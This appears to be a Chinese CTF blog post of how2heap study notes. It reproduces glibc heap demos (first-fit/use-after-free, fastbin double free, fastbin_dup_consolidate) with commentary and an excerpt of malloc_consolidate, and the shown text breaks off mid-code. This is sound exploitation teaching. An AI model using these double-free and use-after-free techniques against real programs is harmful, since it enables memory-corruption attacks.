<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【how2heap】学习笔记 | C7</title><meta name="keywords" content="CTF/Pwn"><meta name="author" content="C7"><meta name="copyright" content="C7"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前置git clone https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap.gitcd how2heapmake  largebin、unsorted bin为先进先出，tcache、fastbin，small bin为先进后出  0x01 first-fit源代码这个文件不是攻击demo，这个对glibc的一个机制(first-fit)的一个说明，并且这个机制常用在UA">
<meta property="og:type" content="article">
<meta property="og:title" content="【how2heap】学习笔记">
<meta property="og:url" content="https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="C7">
<meta property="og:description" content="前置git clone https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap.gitcd how2heapmake  largebin、unsorted bin为先进先出，tcache、fastbin，small bin为先进后出  0x01 first-fit源代码这个文件不是攻击demo，这个对glibc的一个机制(first-fit)的一个说明，并且这个机制常用在UA">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/05/20/EbwjRFDSotqX95g.png">
<meta property="article:published_time" content="2021-05-10T03:08:56.640Z">
<meta property="article:modified_time" content="2021-05-20T04:44:29.277Z">
<meta property="article:author" content="C7">
<meta property="article:tag" content="CTF&#x2F;Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/05/20/EbwjRFDSotqX95g.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

const saveToLocal = {
  // ttl 單位是 天
  set: function setWithExpiry(key, value, ttl) {
    if (ttl === 0) return
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-05-20 12:44:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><link rel="stylesheet" href="/clock/css/clock.css"/><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/MonoFonts.addition.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macWhite.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/font-awesome-animation.min.css"><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="C7" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="C7" type="application/rss+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/./"><i class="fa-fw fa fa-home faa-shake animated-hover"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive faa-shake animated-hover"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags faa-shake animated-hover"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open faa-shake animated-hover"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link faa-shake animated-hover"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart faa-shake animated-hover"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad faa-shake animated-hover"></i><span> 放松一下</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/games/2048/"><i class="fa-fw fa fa-gamepad faa-shake animated-hover"></i><span> 2048 经典2048</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="http://taqini.space/games/battle-city/#/"><i class="fa-fw fa fa-gamepad faa-shake animated-hover"></i><span> BattleCity 坦克大战</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">C7</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/./"><i class="fa-fw fa fa-home faa-shake animated-hover"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive faa-shake animated-hover"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags faa-shake animated-hover"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open faa-shake animated-hover"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link faa-shake animated-hover"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart faa-shake animated-hover"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad faa-shake animated-hover"></i><span> 放松一下</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/games/2048/"><i class="fa-fw fa fa-gamepad faa-shake animated-hover"></i><span> 2048 经典2048</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="http://taqini.space/games/battle-city/#/"><i class="fa-fw fa fa-gamepad faa-shake animated-hover"></i><span> BattleCity 坦克大战</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【how2heap】学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-10T03:08:56.640Z" title="发表于 2021-05-10 11:08:56">2021-05-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-20T04:44:29.277Z" title="更新于 2021-05-20 12:44:29">2021-05-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shellphish/how2heap.git</span><br><span class="line">cd how2heap</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<blockquote>
<p>largebin、unsorted bin为先进先出，tcache、fastbin，small bin为先进后出</p>
</blockquote>
<h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first-fit"></a>0x01 first-fit</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这个文件不是攻击demo，这个对glibc的一个机制(first-fit)的一个说明，并且这个机制常用在UAF中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 分配两个缓冲区，不一定是fastbin，可以比较大的</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">// 我们不需要在释放其他缓冲区，只要我们的分配小于0x512，就可以从刚刚free的内存中取</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序结果及调试"><a href="#程序结果及调试" class="headerlink" title="程序结果及调试"></a>程序结果及调试</h2><p>我们在源码的32行下一个断点，康康此时的结果</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508176426/0" alt="image-20210510113041298"></p>
<p>可以看到此时的a，c位于同一内存空间</p>
<p>现在我们执行完<code>strcpy(c,&quot;this is C!&quot;)</code>,再康康结果</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508185273/0" alt="image-20210510113219170"></p>
<p>此时更改c成功更改了a的内容</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先分配了两个chunk块：a(0x512)，b(0x256)</p>
<p>然后给A赋值后，释放A，之后分配c(0x500)</p>
<p>然后给C赋值为”this is C”,此时输出a,c的地址和内容</p>
<p>发现a块和c块内存地址相同,但a的内容改为了C,程序成功通过修改c来修改来a块</p>
<p>而这也可以通过修改a块来修改c块的内容,而这也是一个uaf漏洞(<strong>free后并未置0</strong>) :)</p>
<h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 一个基于fastbin的double-free利用</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果再free一次，程序就会crash，因为a是free链上最顶的chunk</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因此我们free b</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">    <span class="comment">// 现在我们再free一次a</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">// 现在我们的free链变成了 a-&gt;b-&gt;a</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试"><a href="#运行结果及调试" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先我们看下没free前的堆</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508228458/0" alt="image-20210510114157569"></p>
<p>一共三个堆块，a，b，c，然后我们free a</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508231494/0" alt="image-20210510114245279"></p>
<p>然后free b</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508233420/0" alt="image-20210510114313375"></p>
<p>然后再free a</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508244838/0" alt="image-20210510114604143"></p>
<p>可以看到此时已经构成了一个chunk环即a-&gt;b-&gt;a，此时我们就可以分配两次0x602000。</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序先申请了三个chunk a，b，c</p>
<p>然后释放a，再释放b，再释放a</p>
<p>此时的free list为a-&gt;b-&gt;a</p>
<p>然后再malloc3次分配到了a,b,a的内存,此时我们就得到了两次a的内存,修改其中任意一个就会影响另一块,这也就是double free的攻击demo了，这其实也算是fastbin的一个特性了。</p>
<p>PS：这里为什么fastbin会成功呢</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</span></span><br><span class="line"><span class="comment">//fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以只要不是连续释放同一个堆块即可。</p>
<h1 id="0x03-fastbin-dup-consolidate"><a href="#0x03-fastbin-dup-consolidate" class="headerlink" title="0x03 fastbin_dup_consolidate"></a>0x03 fastbin_dup_consolidate</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 分配一个large bin来触发malloc_consolidate</span></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 通过malloc_consolidate函数我们可以把free掉的p1移动到unsorted bin  </span></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-1"><a href="#运行结果及调试-1" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>我们首先看一下malloc两次后的结果</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508541457/0" alt="image-20210510131237934"></p>
<p>此时我们free p1</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508542876/0" alt="image-20210510131306643"></p>
<p>此时我们malloc一个0x400的的大chunk，这样就会触发<code>malloc_consolidate</code></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508545731/0" alt="image-20210510131408943"></p>
<p>可以看到此时我们的p1就被放入到<code>small bin</code>中了</p>
<h3 id="问题：这个过程到底发生了什么呢"><a href="#问题：这个过程到底发生了什么呢" class="headerlink" title="问题：这个过程到底发生了什么呢"></a>问题：这个过程到底发生了什么呢</h3><p>我们现来康康<code>malloc_consolidate</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span 